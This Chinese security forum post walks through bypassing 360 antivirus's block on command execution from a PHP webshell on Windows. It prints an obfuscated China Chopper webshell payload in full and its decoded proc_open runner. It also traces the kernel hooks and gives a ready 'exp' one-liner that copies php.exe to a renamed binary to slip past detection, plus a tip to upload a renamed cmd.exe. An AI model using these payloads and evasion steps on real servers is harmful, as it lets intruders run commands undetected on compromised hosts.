最近看到一篇文章讲的是在php环境下绕过360执行命令

早前这个也被这个问题困扰了很久也没有个正经的解决办法，用蚁剑的ascmd命令也不是很好用，后面就没看了

结果看到这篇文章于是又想再试试，当然首先还要感谢作者大大给的灵感，文章地址会放在结尾

其实这篇文章没有什么顺序，就是记录一下本人一路各种试下来的结果

0x01 前言
=======

仔细看文章会发现作者使用的是菜刀，拦截的是程序

我使用的是蚁剑，拦截的是cmd

那就要从蚁剑和菜刀的流量包入手了

![1.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-46eb37e19a874c1a38de83494c0e9338e8663357.png)

0x02 流量分析
=========

蚁剑的流量包已经分析过了就不分析了..在之前的文章里面有写

流量中找了一下这是蚁剑完整执行的命令

```cmd
cmd /c "cd /d "C:/phpstudy_pro/WWW"&蚁剑shell接收的命令&echo 844fa65177&cd&echo b9efda2bfbc"
```

后面的echo不用管只是蚁剑用来定位输出用的

蚁剑这里用的是cmd /c执行命令，这是被ban的关键原因

下面去看下菜刀的流量，因为菜刀不能设置代理就要用wireshark抓一下了

```php
cmd=array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JG09Z2V0X21hZ2ljX3F1b3Rlc19ncGMoKTskcD0nY21kJzskcz0nY2QgL2QgQzpcXHBocHN0dWR5X3Byb1xcV1dXXFwmbm90ZXBhZCZlY2hvIFtTXSZjZCZlY2hvIFtFXSc7JGQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pOyRjPXN1YnN0cigkZCwwLDEpPT0iLyI%2FIi1jIFwieyRzfVwiIjoiL2MgXCJ7JHN9XCIiOyRyPSJ7JHB9IHskY30iOyRhcnJheT1hcnJheShhcnJheSgicGlwZSIsInIiKSxhcnJheSgicGlwZSIsInciKSxhcnJheSgicGlwZSIsInciKSk7JGZwPXByb2Nfb3Blbigkci4iIDI%2BJjEiLCRhcnJheSwkcGlwZXMpOyRyZXQ9c3RyZWFtX2dldF9jb250ZW50cygkcGlwZXNbMV0pO3Byb2NfY2xvc2UoJGZwKTtwcmludCAkcmV0OztlY2hvKCJYQFkiKTtkaWUoKTs%3D'));\");"));
```

然后base64解码一下

```php
@ini_set("display_errors", "0");
@set_time_limit(0);
if (PHP_VERSION < '5.3.0') {
    @set_magic_quotes_runtime(0);
};
echo ("X@Y");
$m = get_magic_quotes_gpc();
$p = 'cmd';
$s = 'cd /d C:\\phpstudy_pro\\WWW\\&notepad&echo [S]&cd&echo [E]';
$d = dirname($_SERVER["SCRIPT_FILENAME"]);
$c = substr($d, 0, 1) == "/" ? "-c \"{$s}\"" : "/c \"{$s}\"";
$r = "{$p} {$c}";
$array = array(
    array(
        "pipe",
        "r"
    ) ,
    array(
        "pipe",
        "w"
    ) ,
    array(
        "pipe",
        "w"
    )
);
$fp = proc_open($r . " 2>&1", $array, $pipes);
$ret = stream_get_contents($pipes[1]);
proc_close($fp);
print $ret;;
echo ("X@Y");
die();
```

执行的命令是这样的

```cmd
cmd /c "cd /d C:\phpstudy_pro\WWW\&菜刀shell接收的命令&echo [S]&cd&echo [E]
```

？怎么差不多？感觉蚁剑就是多了几种执行命令的方式

然后又测试了一下发现一个问题

蚁剑执行完之后再用菜刀执行 拦截

直接用菜刀执行 不拦截

？？？

思索了一下想起来蚁剑的请求头在不设置的情况是有很明显的特征的

然后看了一下好像最新的蚁剑已经没这个特征了，好吧那再来观察一下别的

先打开进程管理器然后用菜刀执行命令，可以看到php-cgi创建了一个cmd就被拦截了，拦截提示显示的拦截的是cmd，这里顺便说一下第一个cmd是肯定可以创建成功的，因为php的system函数就是调用cmd /c执行命令的，后面可以会在dbg中看到

![2.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-ec0bfa6014ee8c88e739e27768db80b0816f2251.png)

然后用蚁剑执行相同命令

![3.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-5b7b01c69e54dacd6d1a99ed2b020b30d9c193d8.png)  
可以看到蚁剑是第二个cmd已经创建出来在执行命令的时候被拦截了

那猜测360可能有的检测

1. 检测流量，流量中出现一些奇怪的东西直接拦截
2. 检测windowsapi，调用的时候出现一些奇怪的参数就拦截

那流量就不说了，大佬们应该有无数方法混淆,360对流量的查杀也不是很严格，甚至手动都可以执行

第二种windowsapi，windows常见的创建进程就是CreateProcess

这里说一下phpstudy创建进程32位是CreateProcessA，64位CreateProcessW

去dbg里面调试看一下

0x03 进程调试
=========

因为cmd是php-cgi创建出来的，所以把dbg附加到php-cgi上

![4.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-e2d671dc135714f354a968b6d8fb1b1c3f496aec.png)

断到了，也可以看到右上角的命令行，这里可以知道system函数也是使用cmd /c执行系统命令的

用蚁剑执行命令然后跟一下看看能不能是不是因为Hook了所以不能执行命令的

跟着跟着就到ntdll去了，走到NtResumeThread然后到内核里去了

![5.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-9519feae7d1724e2fab330d1b12b92c4f6685fdc.png)

可以看到到CALL之后就弹框了，这里不用管这个函数有什么作用，R0的Hook用R3应该是很难解决的

这里再说一下64位的拦截的NtCreateUserProcess这个函数，也是到syscall拦住了，这里就不贴图了

0x04 无端猜想
=========

不管是NtResumeThread还是NtResumeThread肯定都是常用的api要调用到的底层函数，那360到底是怎么知道哪个进程要拦截？会不会是通过进程名？

本来想到PEB里面去改的，但是太懒了，想在外面重命名试试，但是php-cgi好像不能直接执行命令，直接用php.exe试试

```cmd
php -r "system('cmd /c notepad')";
```

![6.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-2cc55f3432b7d103ba6215d5c9509822f31b91e1.png)

没想到这个也拦截了，那可以重命名试一下

![7.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-16cd76779b3552016625d2b8352dc4c6b844e927.png)

改成a.exe之后可以执行了，只要打通一次后面直接用php.exe也不会拦截了

那步骤就是先把php.exe复制出来改名为a.exe执行一次cmd后就不会被拦截了

exp:

```php
cmd=chdir(php路径);copy("php.exe","a.exe");system("a -r \"system(\\\"cmd /c tasklist\\\");\";");
```

只要在webshell先手动执行这段php就不会被拦截了

注意转义..好坑

![1.gif](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-f81d772f3fea3030b5e7ae5055e6f99c9a43ccf9.gif)

差不多就是这样了

再来个极端点的情况，打的时候管理员在线，管理员看到老是弹框直接点了不再提醒

这时候这种方法也会执行不了，但是问题不大，你可以从windows7上下载cmd然后传到php的目录再重命名后再执行

```cmd
biesha /c tasklist
```

也是可以bypass的，这里就不截图了，太懒了

0x05 总结
=======

还有一点会直接拦截进程，这在原文中也有说到过，绕过这个的就很多了像原文作者说的白名单啥的，rundll32.exe也可以，网上搜搜白名单还是挺多的就不写了

其实这里想到改文件名也是碰巧，之前提权到system的文件名是SYSTYEM\_CMD，拿上次测试，直接用php执行结果360直接报了拦截CMD，这时候就有点奇怪了，明明没有调用CMD，然后就想到了可能是文件名的问题。

总的来说就多猜猜吧说不定就绕过了

0x06 参考
=======

<https://mp.weixin.qq.com/s/V4jKcz9TtucaKfkmEKGdZw>